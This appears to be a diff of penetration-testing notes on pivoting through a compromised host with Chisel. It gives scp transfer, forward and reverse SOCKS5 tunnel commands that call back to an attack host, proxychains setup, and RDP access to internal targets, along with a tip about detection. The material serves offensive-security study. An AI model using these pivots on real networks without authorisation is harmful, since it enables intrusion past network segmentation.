@@ -1,108 +1,77 @@
 
-# SOCKS5 Tunneling with Chisel
+1. Determine if the compromised host allows inbound connections on arbitrary ports.
+2. If inbound is allowed: Deploy a Chisel server on the pivot host and connect from the attack host.
+3. If inbound is blocked (firewall restriction): Start a Chisel server with the reverse flag on the attack host and have the pivot host connect back.
+4. Update `/etc/proxychains.conf` to match the local listening port (default 1080).
+5. Execute internal tools through `proxychains`.
 
-**Chisel** is a TCP/UDP-based tunneling tool written in Go that transports data via HTTP, secured using SSH. It is designed to create client-server tunnel connections in firewall-restricted environments.
+---
 
-## Preparation and Setup
+## Forward SOCKS5 Tunneling
 
-### 1. Build the Chisel Binary
+Internal network segments are unreachable from the attack host and the pivot host allows inbound traffic on the chosen listener port.
 
-Chisel must be compiled for the specific architecture of the attack host and the pivot host.
+Clone the repository to the attack host
 
-|Action|Command|
-|:--|:--|
-|**Clone Repository**|`git clone https://github.com/jpillora/chisel.git`|
-|**Build Binary**|`cd chisel && go build`|
+```
+git clone https://github.com/jpillora/chisel.git
+```
 
-**Edge Cases & Failure Conditions:**
+Build the binary using the local Go environment
 
-- **glibc Discrepancies:** Errors may occur if the `glibc` library versions differ between the build workstation and the target. If this happens, use an older prebuilt version from the GitHub Releases section.
-- **Detection & Performance:** Large file transfers can trigger detection or impact performance. Consider shrinking the binary size before transfer.
+```
+go build
+```
 
-### 2. Transfer to Pivot Host
-
-Once built, transfer the binary to the compromised host.
+Transfer the binary to the pivot host via SCP
 
 ```
 scp chisel <USERNAME>@<PIVOT_IP>:~/
 ```
 
----
+Start the server on the pivot host listening for SOCKS5 connections
 
-## Technique 1: Standard SOCKS5 Tunneling
+```
+./chisel server -v -p <PORT> --socks5
+```
 
-**Use Case:** Use this technique when the attack host can establish **direct inbound connections** to the pivot host.
+Connect the attack host client to the pivot server
 
-### Operational Workflow
+```
+./chisel client -v <PIVOT_IP>:<PORT> socks
+```
 
-1. **Start the Chisel Server on the Pivot Host:** This creates a listener that will forward traffic to all networks accessible by the pivot host.
-    
-    ```
-    ./chisel server -v -p <PORT> --socks5
-    ```
-    
-2. **Connect the Chisel Client from the Attack Host:** This establishes the tunnel and opens a local SOCKS5 proxy port (typically `1080`) on the attack machine.
-    
-    ```
-    ./chisel client -v <PIVOT_IP>:<PORT> socks
-    ```
-    
-3. **Configure Proxychains:** Modify `/etc/proxychains.conf` to route traffic through the newly created tunnel.
-    
-    ```
-    # Add to the end of /etc/proxychains.conf
-    socks5 127.0.0.1 <SOCKS_PORT>
-    ```
-    
-4. **Execute Attacks:** Use `proxychains` to reach internal targets via the pivot.
-    
-    ```
-    proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
-    ```
-    
+Add the tunnel to the proxy list in /etc/proxychains.conf
 
----
+```
+socks5 127.0.0.1 1080
+```
 
-## Technique 2: Chisel Reverse Pivot
+Run tools through the established SOCKS5 tunnel
 
-**Use Case:** Use when **firewall rules restrict inbound connections** to the compromised pivot host. In this scenario, the pivot host initiates the connection back to the attack machine.
+```
+proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
+```
 
-### Operational Workflow
+- **glibc version discrepancy** will trigger execution errors; compare library versions between systems or use prebuilt binaries.
+- **Large binary size** increases the risk of detection and impacts performance during transfer.
 
-1. **Start the Chisel Server on the Attack Host:** Enable the `--reverse` option to allow the server to accept reversed remote connections.
-    
-    ```
-    sudo ./chisel server --reverse -v -p <PORT> --socks5
-    ```
-    
-2. **Connect the Chisel Client from the Pivot Host:** The client specifies `R:socks` to indicate that the server should listen on its default SOCKS port (1080) and proxy traffic back through the client to the internal network.
-    
-    ```
-    ./chisel client -v <ATTACK_IP>:<PORT> R:socks
-    ```
-    
-3. **Configure Proxychains:** Ensure `/etc/proxychains.conf` points to the local SOCKS port on the attack host.
-    
-    ```
-    socks5 127.0.0.1 1080
-    ```
-    
-4. **Execute Attacks:** Use `proxychains` to tunnel tools through the established reverse connection.
-    
-    ```
-    proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
-    ```
-    
+## Reverse SOCKS5 Tunneling
 
----
+Firewall rules restrict inbound connections to the compromised target host, requiring the pivot host to initiate the outbound connection.
 
-## Command Reference Summary
+Start the server on the attack host with reverse capabilities enabled
 
-|Role|Mode|Command|
-|:--|:--|:--|
-|**Pivot Host**|Standard (Server)|`./chisel server -v -p <PORT> --socks5`|
-|**Attack Host**|Standard (Client)|`./chisel client -v <PIVOT_IP>:<PORT> socks`|
-|**Attack Host**|Reverse (Server)|`sudo ./chisel server --reverse -v -p <PORT> --socks5`|
-|**Pivot Host**|Reverse (Client)|`./chisel client -v <ATTACK_IP>:<PORT> R:socks`|
+```
+sudo ./chisel server --reverse -v -p <PORT> --socks5
+```
 
-**Attack Implications:** Successfully establishing a Chisel tunnel (standard or reverse) allows the attack machine to bypass network segmentation and interact with internal assets, such as Domain Controllers, that are not directly reachable from the external network.
+Connect from the pivot host back to the attack host using a reverse remote
+
+```
+./chisel client -v <ATTACK_IP>:<PORT> R:socks
+```
+
+- **Reverse remote prefix** must be set to `R:socks` to ensure the server listens on its default SOCKS port (1080) and terminates at the client.
+
+> ⚠️ Gap: Chisel requires the specific Go build environment; if the target lacks specific dependencies or has an incompatible glibc version, the binary will fail to execute. Always have prebuilt versions for various architectures ready.
